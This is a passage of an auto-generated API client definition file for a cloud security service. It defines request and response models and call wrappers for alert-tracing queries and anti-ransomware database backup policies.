  suspiciousmediumTotal?: int32(name='SuspiciousmediumTotal', description='The number of alerts whose risk level is suspicious.', example='28'),
  suspiciousseriousTotal?: int32(name='SuspiciousseriousTotal', description='The number of alerts whose risk level is urgent.', example='0'),
  trojan?: int32(name='Trojan', description='The number of webshell alerts.', example='0'),
  vul?: int32(name='Vul', description='The number of unfixed vulnerabilities.', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities whose severity level is high.', example='16'),
  vulDealedTotal?: int32(name='VulDealedTotal', description='The total number of fixed vulnerabilities.', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities whose severity level is medium.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of unfixed vulnerabilities whose severity level is low.', example='0'),
  vulTotal?: int32(name='VulTotal', description='The total number of vulnerabilities.', example='0'),
}

model DescribeTotalStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeTotalStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries event statistics.
 *
 * @param request DescribeTotalStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeTotalStatisticsResponse
 */
async function describeTotalStatisticsWithOptions(request: DescribeTotalStatisticsRequest, runtime: Util.RuntimeOptions): DescribeTotalStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTotalStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries event statistics.
 *
 * @param request DescribeTotalStatisticsRequest
 * @return DescribeTotalStatisticsResponse
 */
async function describeTotalStatistics(request: DescribeTotalStatisticsRequest): DescribeTotalStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTotalStatisticsWithOptions(request, runtime);
}

model DescribeTraceInfoDetailRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.

This parameter is required.', example='sas'),
  incidentTime?: long(name='IncidentTime', description='The timestamp of the detection. Unit: milliseconds.', example='1670555392000'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.0.1'),
  type?: string(name='Type', description='The type of the vertex. Set the value to **SAS_INCIDENT**.

This parameter is required.', example='SAS_INCIDENT'),
  uuid?: string(name='Uuid', description='The UUID of the server.

This parameter is required.', example='1627f2d7-aaa2-4ed1-b07a-xxxxxxxxxxxxxx'),
  vertexId?: string(name='VertexId', description='The ID of the vertex. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the ID.

This parameter is required.', example='cce1d28dxxxxxxxxxxxxxxxx'),
}

model DescribeTraceInfoDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-XXXXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  traceInfoDetail?: {
    edgeList?: [ 
      {
        count?: int32(name='Count', description='The number of times.', example='1'),
        endId?: string(name='EndId', description='The ending vertex ID of the edge of the tracing diagram.', example='a1d1fa39e5345dcef3f9712172cxxxxx'),
        startId?: string(name='StartId', description='The starting vertex ID of the edge of the tracing diagram.', example='02b4bf933c8e3bb8b9465eee502xxxxx'),
        time?: string(name='Time', description='The point in time.', example='2022-12-21 10:24:42'),
        type?: string(name='Type', description='The type of the edge of the tracing diagram.', example='trigger_file_alert'),
      }
    ](name='EdgeList', description='An array that consists of the edges of the tracing diagram.'),
    entityTypeList?: [ 
      {
        dbId?: int32(name='DbId', description='This parameter is deprecated.', example='Deprecated'),
        displayColor?: string(name='DisplayColor', description='The rendering color of the vertex.', example='#fff'),
        displayIcon?: string(name='DisplayIcon', description='The icon style of the vertex.', example='https://img.alicdn.com/tfs/TB176P5OgDqK1RjSZSyXXaxEVXa-49-48.png'),
        displayTemplate?: string(name='DisplayTemplate', description='This parameter is deprecated.', example='[{"name":"${logtime}","value":"$!{time}"}]'),
        gmtCreate?: long(name='GmtCreate', description='The timestamp when the vertex was created.', example='2022-10-09T11:47Z'),
        gmtModified?: long(name='GmtModified', description='The time when the vertex was last modified.', example='2022-10-09T11:47Z'),
        id?: string(name='Id', description='The ID of the vertex type.', example='Alert'),
        limit?: int32(name='Limit', description='This parameter is deprecated.', example='Deprecated'),
        name?: string(name='Name', description='The name of the vertex type.', example='Alert'),
        namespace?: string(name='Namespace', description='The namespace.', example='*'),
        offset?: int32(name='Offset', description='This parameter is deprecated.', example='Deprecated'),
      }
    ](name='EntityTypeList', description='An array that consists of the metadata configurations of the vertex type.'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed', description='Indicates whether the edge is a directional edge. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
        displayColor?: string(name='DisplayColor', description='The rendering color of the edge.', example='#fff'),
        name?: string(name='Name', description='The name of the edge type.', example='file'),
        relationTypeId?: string(name='RelationTypeId', description='The ID of the edge type.', example='netflow_to_process'),
        showType?: string(name='ShowType', description='This parameter is deprecated.', example='Deprecated'),
      }
    ](name='RelationTypeList', description='An array that consists of the metadata configurations of the edge type.'),
    vertexList?: [ 
      {
        count?: int32(name='Count', description='The number of times.', example='1'),
        id?: string(name='Id', description='The ID of the vertex.', example='a1d1fa39e5345dcef3f9712172xxxxxx'),
        name?: string(name='Name', description='The name of the entity represented by the vertex.', example='/usr/local/tomcat'),
        neighborList?: [ 
          {
            count?: int32(name='Count', description='The number of neighbor nodes.', example='1'),
            hasMore?: boolean(name='HasMore', description='Indicates whether one more page is returned.', example='False'),
            type?: string(name='Type', description='The type of the neighbor node. The value is fixed as **alert**.', example='alert'),
          }
        ](name='NeighborList', description='An array that consists of the neighbor nodes.'),
        time?: string(name='Time', description='The point in time.', example='2022-12-21 10:24:42'),
        type?: string(name='Type', description='The type of the entity represented by the vertex.', example='file_path'),
      }
    ](name='VertexList', description='An array that consists of all vertexes of the tracing diagram.'),
  }(name='TraceInfoDetail', description='The details of the tracing diagram.'),
}

model DescribeTraceInfoDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeTraceInfoDetailResponseBody(name='body'),
}

/**
 * @summary Queries the trace information about alerts.
 *
 * @param request DescribeTraceInfoDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeTraceInfoDetailResponse
 */
async function describeTraceInfoDetailWithOptions(request: DescribeTraceInfoDetailRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the trace information about alerts.
 *
 * @param request DescribeTraceInfoDetailRequest
 * @return DescribeTraceInfoDetailResponse
 */
async function describeTraceInfoDetail(request: DescribeTraceInfoDetailRequest): DescribeTraceInfoDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoDetailWithOptions(request, runtime);
}

model DescribeTraceInfoNodeRequest {
  eventName?: string(name='EventName', description='The name of the alert event.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of alerts events.', example='WEBSHELL'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.

This parameter is required.', example='sas'),
  incidentTime?: long(name='IncidentTime', description='The time when the alert event was first detected.', example='1635978934000'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX'),
  type?: string(name='Type', description='The type of the vertex. You can call the [DescribeTraceInfoDetail](~~DescribeTraceInfoDetail~~) operation to query the types of vertexes.

This parameter is required.', example='SAS_ASSET'),
  uuid?: string(name='Uuid', description='The UUID of the server. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.

This parameter is required.', example='6f346617-eef9-45e6-b6d1-946xxxxxxxx'),
  vertexId?: string(name='VertexId', description='The ID of the vertex.

This parameter is required.', example='03da4e2350a3eb50cd25a18cexxxxxxx'),
}

model DescribeTraceInfoNodeResponseBody = {
  node?: {
    name?: string(name='Name', description='The name of the node.', example='login'),
    propertyList?: [ 
      {
        name?: string(name='Name', description='The name of the property.', example='Incident'),
        value?: string(name='Value', description='The value of the property.', example='Alert'),
      }
    ](name='PropertyList', description='An array that consists of the properties of the node.'),
    type?: string(name='Type', description='The type of the node.', example='Alert'),
  }(name='Node', description='The details about the node.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F35F45B0-5D6B-4238-BE02-A62DXXXXXXXX'),
}

model DescribeTraceInfoNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeTraceInfoNodeResponseBody(name='body'),
}

/**
 * @summary Queries the details about a trace node.
 *
 * @param request DescribeTraceInfoNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeTraceInfoNodeResponse
 */
async function describeTraceInfoNodeWithOptions(request: DescribeTraceInfoNodeRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about a trace node.
 *
 * @param request DescribeTraceInfoNodeRequest
 * @return DescribeTraceInfoNodeResponse
 */
async function describeTraceInfoNode(request: DescribeTraceInfoNodeRequest): DescribeTraceInfoNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoNodeWithOptions(request, runtime);
}

model DescribeUniBackupDatabaseRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
  instanceName?: string(name='InstanceName', description='The name of the Elastic Compute Service (ECS) instance.', example='test'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  queryType?: string(name='QueryType', description='The condition that is used to query the database. Valid values:

*   **create**: newly created
*   **restore**: restored', example='create'),
  uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hongkong'),
}

model DescribeUniBackupDatabaseResponseBody = {
  databaseList?: [ 
    {
      agentStatus?: string(name='AgentStatus', description='The status of the anti-ransomware agent. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
      createdByProduct?: string(name='CreatedByProduct', description='The service from which the database is created. Valid values:

*   **HBR**: HBR
*   **AEGIS**: Security Center', example='AEGIS'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='apns_tt180'),
      databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
      databaseVersion?: string(name='DatabaseVersion', description='The version of the database engine.', example='12.0.4100.1'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp15aho9hhftvmhw****'),
      instanceName?: string(name='InstanceName', description='The name of the instance to which the database belongs.', example='sql-test-001'),
      instanceUuid?: string(name='InstanceUuid', description='The UUID of the Hybrid Backup Recovery (HBR) agent that is used to back up the data of the database.', example='85878b284df911ec800000163e19****'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      status?: string(name='Status', description='The status of the ECS instance. Valid values:

*   **Stopped**
*   **Running**', example='Running'),
    }
  ](name='DatabaseList', description='An array that consists of the information about the databases.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeUniBackupDatabaseResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniBackupDatabaseResponseBody(name='body'),
}

/**
 * @summary Queries the information about databases for which anti-ransomware policies are created.
 *
 * @param request DescribeUniBackupDatabaseRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniBackupDatabaseResponse
 */
async function describeUniBackupDatabaseWithOptions(request: DescribeUniBackupDatabaseRequest, runtime: Util.RuntimeOptions): DescribeUniBackupDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryType)) {
    query['QueryType'] = request.queryType;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about databases for which anti-ransomware policies are created.
 *
 * @param request DescribeUniBackupDatabaseRequest
 * @return DescribeUniBackupDatabaseResponse
 */
async function describeUniBackupDatabase(request: DescribeUniBackupDatabaseRequest): DescribeUniBackupDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupDatabaseWithOptions(request, runtime);
}

model DescribeUniBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_Hpm'),
}

model DescribeUniBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  uniBackupPolicies?: [ 
    {
      agentErrorMessage?: string(name='AgentErrorMessage', description='The error message for the anti-ransomware agent.', example='INSTALL_TIMEOUT'),
      agentStatus?: string(name='AgentStatus', description='The status of the agent. Valid values:

*   **UNKNOWN**
*   **INSTALLED**
*   **INSTALL_FAILED**
*   **UNINSTALL_FAILED**', example='INSTALLED'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='abc123'),
      databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the backup task fails.', example='EXPIRED'),
      errorMessage?: string(name='ErrorMessage', description='The error message for the anti-ransomware policy.', example='AttachRamRoleError'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-9dp7mubt5wit6g0h****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      instanceStatus?: string(name='InstanceStatus', description='The status of the Elastic Compute Service (ECS) instance. Valid values:

*   **Stopped**
*   **Running**', example='Running'),
      instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.', example='cf1bcad4063f11ed800000163e0e****'),
      latestBackResult?: string(name='LatestBackResult', description='The execution result of the last backup task.', example='completed'),
      latestBackupTime?: string(name='LatestBackupTime', description='The time when the last backup task was executed.', example='2022-01-01 00:00:11'),
      planStatus?: string(name='PlanStatus', description='The status of the backup task. Valid values:

*   **init**
*   **running**
*   **completed**
*   **restoring**
*   **creating**
*   **created**', example='creating'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_37f'),
      policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**
*   **opening**
*   **closing**
*   **deleting**
*   **enabled**
*   **disabled**', example='opening'),
      uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hangzhou'),
    }
  ](name='UniBackupPolicies', description='An array that consists of the anti-ransomware policies.'),
}

model DescribeUniBackupPoliciesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniBackupPoliciesResponseBody(name='body'),
}

/**
 * @summary Queries the anti-ransomware policies that are created for databases.
 *
 * @param request DescribeUniBackupPoliciesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniBackupPoliciesResponse
 */
async function describeUniBackupPoliciesWithOptions(request: DescribeUniBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the anti-ransomware policies that are created for databases.
 *
 * @param request DescribeUniBackupPoliciesRequest
 * @return DescribeUniBackupPoliciesResponse
 */
async function describeUniBackupPolicies(request: DescribeUniBackupPoliciesRequest): DescribeUniBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPoliciesWithOptions(request, runtime);
}

model DescribeUniBackupPolicyDetailRequest {
  policyId?: string(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
}

model DescribeUniBackupPolicyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniBackupPolicyDTO?: {
    accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
    agentStatus?: string(name='AgentStatus', description='The status of the database client. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
    databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='ORACLE'),
    fullPlan?: {
      days?: [ string ](name='Days', description='An array that consists of the days of a week on which the backup is performed.'),
      interval?: int32(name='Interval', description='The interval of backup tasks.', example='2'),
      planType?: string(name='PlanType', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='daily'),
      startTime?: string(name='StartTime', description='The time when the full backup started. The time is in the HH:mm:ss format.', example='00:10:00'),
    }(name='FullPlan', description='The details of the policy for full backup.'),
    incPlan?: {
      days?: [ string ](name='Days', description='An array that consists of the days of a week on which the backup is performed.'),
      interval?: int32(name='Interval', description='The interval of backup tasks.', example='2'),
      planType?: string(name='PlanType', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='daily'),
      startTime?: string(name='StartTime', description='The time when the incremental data backup starts. The time is in the hh:mm:ss format.', example='00:10:00'),
    }(name='IncPlan', description='The policy for incremental data backup.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zefcy2id5d60m9t****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-01'),
    policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
    policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_test_sql'),
    policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**: initializing
*   **opening**: enabled
*   **closing**: disabled
*   **deleting**: deleting', example='opening'),
    retention?: int32(name='Retention', description='The retention period of the backup snapshot.', example='7'),
    speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='5242880'),
  }(name='UniBackupPolicyDTO', description='The details of the anti-ransomware policy.'),
}

model DescribeUniBackupPolicyDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniBackupPolicyDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of an anti-ransomware policy for databases.
 *
 * @param request DescribeUniBackupPolicyDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniBackupPolicyDetailResponse
 */
async function describeUniBackupPolicyDetailWithOptions(request: DescribeUniBackupPolicyDetailRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPolicyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an anti-ransomware policy for databases.
 *
 * @param request DescribeUniBackupPolicyDetailRequest
 * @return DescribeUniBackupPolicyDetailResponse
 */
async function describeUniBackupPolicyDetail(request: DescribeUniBackupPolicyDetailRequest): DescribeUniBackupPolicyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPolicyDetailWithOptions(request, runtime);
}

model DescribeUniBackupStatisticsResponseBody = {
  protectedDatabaseCount?: int32(name='ProtectedDatabaseCount', description='The number of protected database instances.', example='1'),
  regionCountList?: [ 
    {
      automaticCount?: string(name='AutomaticCount', description='The number of database instances that are automatically scanned.', example='1'),
      regionId?: string(name='RegionId', description='The ID of the region in which the database instance resides.', example='cn-shanghai'),
    }
  ](name='RegionCountList', description='The regions of the database instances.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  restoringTaskCount?: int32(name='RestoringTaskCount', description='The number of the restoration tasks that are running.', example='0'),
  totalRecoverableCount?: int32(name='TotalRecoverableCount', description='The total number of database instances that can be restored.', example='3'),
  totalRestoreTaskCount?: int32(name='TotalRestoreTaskCount', description='The total number of the restoration tasks.', example='10'),
  unprotectedDatabaseCount?: int32(name='UnprotectedDatabaseCount', description='The number of unprotected database instances.', example='5'),
}

model DescribeUniBackupStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeUniBackupStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on backups based on anti-ransomware policies.
 *
 * @param request DescribeUniBackupStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeUniBackupStatisticsResponse
 */
async function describeUniBackupStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeUniBackupStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on backups based on anti-ransomware policies.
 *
 * @return DescribeUniBackupStatisticsResponse
 */
async function describeUniBackupStatistics(): DescribeUniBackupStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupStatisticsWithOptions(runtime);
}

model DescribeUniRecoverableListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  database?: string(name='Database', description='The name of the database.', example='msdb'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.

This parameter is required.', example='123'),
}

model DescribeUniRecoverableListResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  database?: string(name='Database', description='The name of the database.', example='msdb'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  recoverableInfoList?: [ 
    {
      firstTime?: long(name='FirstTime', description='The timestamp of the first backup. Unit: milliseconds.', example='1671468180000'),
      lastTime?: long(name='LastTime', description='The timestamp of the last backup. Unit: milliseconds.', example='1671468180000'),
      resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that is used. The database is an Oracle database.', example='4529940.0'),
      resetTime?: long(name='ResetTime', description='The point in time for restoration in the backup version that is used. The database is an Oracle database.', example='2021-01-30 08:04:36'),
      restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files', example='{
      "files": {
            "qtc": "F:\\\\\\\\database\\\\\\\\qtc.mdf",
